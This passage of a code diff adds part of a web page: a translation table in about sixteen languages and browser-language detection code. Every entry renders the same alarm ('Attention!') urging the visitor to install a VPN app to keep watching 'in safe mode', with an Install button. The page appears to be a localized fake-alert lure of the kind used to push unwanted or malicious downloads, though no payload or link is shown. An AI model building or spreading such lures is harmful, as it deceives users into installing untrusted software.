+            },
+            uk: {
+                a1: "Увага!",
+                a2: "Увага!",
+                a3: "Будь ласка, установіть додаток VPN, щоб продовжити перегляд у безпечному режимі.",
+                a4: "Встановити",
+            },
+            zh: {
+                a1: "注意！",
+                a2: "注意！",
+                a3: "请安装 VPN 应用程序以在安全模式下继续观看。",
+                a4: "安装",
+            },
+            ko: {
+                a1: "주의!",
+                a2: "주의!",
+                a3: "안전 모드에서 계속 시청하려면 VPN 앱을 설치하세요.",
+                a4: "설치",
+            },
+            ja: {
+                a1: "注意!",
+                a2: "注意!",
+                a3: "セーフ モードで視聴を続けるには、VPN アプリをインストールしてください。",
+                a4: "インストール",
+            },
+            id: {
+                a1: "Perhatian!",
+                a2: "Perhatian!",
+                a3: "Silakan instal aplikasi VPN untuk terus menonton dalam mode aman.",
+                a4: "Instal",
+            },
+            vi: {
+                a1: "Chú ý!",
+                a2: "Chú ý!",
+                a3: "Vui lòng cài đặt ứng dụng VPN để tiếp tục xem ở chế độ an toàn.",
+                a4: "Cài đặt",
+            },
+            ms: {
+                a1: "Perhatian!",
+                a2: "Perhatian!",
+                a3: "Sila pasang apl VPN untuk terus menonton dalam mod selamat.",
+                a4: "Pasang",
+            },
+            hi: {
+                a1: "ध्यान!",
+                a2: "ध्यान!",
+                a3: "सुरक्षित मोड में देखना जारी रखने के लिए कृपया VPN ऐप इंस्टॉल करें।",
+                a4: "इंस्टॉल करें",
+            },
+            ar: {
+                a1: "انتباه!",
+                a2: "انتباه!",
+                a3: "الرجاء تثبيت تطبيق VPN لمتابعة المشاهدة في الوضع الآمن.",
+                a4: "تثبيت",
+            },
+            fil: {
+                a1: "Atensyon!",
+                a2: "Atensyon!",
+                a3: "Paki-install ang VPN app para magpatuloy sa panonood sa safe mode.",
+                a4: "I-install",
+            },
+            tr: {
+                a1: "Dikkat!",
+                a2: "Dikkat!",
+                a3: "Güvenli modda izlemeye devam etmek için lütfen VPN uygulamasını yükleyin.",
+                a4: "Yükle",
+            },
+            ur: {
+                a1: "توجہ!",
+                a2: "توجہ!",
+                a3: "محفوظ موڈ میں دیکھنا جاری رکھنے کے لیے براہ کرم VPN ایپ انسٹال کریں۔",
+                a4: "انسٹال کریں",
+            },
+            th: {
+                a1: "เรียน!",
+                a2: "เรียน!",
+                a3: "โปรดติดตั้งแอป VPN เพื่อรับชมต่อในเซฟโหมด",
+                a4: "ติดตั้ง",
+            },
+            bn: {
+                a1: "মনোযোগ!",
+                a2: "মনোযোগ!",
+                a3: "নিরাপদ মোডে দেখা চালিয়ে যেতে দয়া করে VPN অ্যাপ ইনস্টল করুন।",
+                a4: "ইনস্টল করুন",
+            },
+            he: {
+                a1: "שים לב!",
+                a2: "שים לב!",
+                a3: "אנא התקן את אפליקציית VPN כדי להמשיך לצפות במצב בטוח.",
+                a4: "התקן",
+            },
+
+        };
+
+    function replace_text(lang) {
+            var elements = document.getElementsByClassName("translatable");
+            var elements = document.querySelectorAll("[data-translate]");
+            for (var i = 0; i < elements.length; i++) {
+                var text = elements[i].getAttribute("data-translate");
+                var translatedText = translation[lang][text];
+                if (translatedText) {
+                    elements[i].innerHTML = translatedText;
+                } else {
+                    console.log("Translation not found for: " + text);
+                }
+            }
+        }
+
+        function translation_available(lang) {
+            if (translation[lang]) {
+                return lang;
+            } else {
+                console.log("Translation not found for language: " + lang);
+                return "source";
+            }
+        }
+
+        function detect_language() {
+            var language = navigator.languages && navigator.languages[0] || navigator.language || navigator.userLanguage;
+            if (language.length > 3) {
+                language = language[0] + language[1];
+            }
+            if (['ar', 'he', 'fa', 'ur'].indexOf(language) >= 0) {
+                document.documentElement.setAttribute('dir', 'rtl');
+            }
+            return translation_available(language);
+        }
+
+        function translate() {
+            var language = detect_language();
+            replace_text(language);
+        }
+
+        // Call the translate function when the page is ready
+        document.addEventListener("DOMContentLoaded", function() {
+            translate();
+        });
+
+</script>
+
+
+  
+
+</body></html>
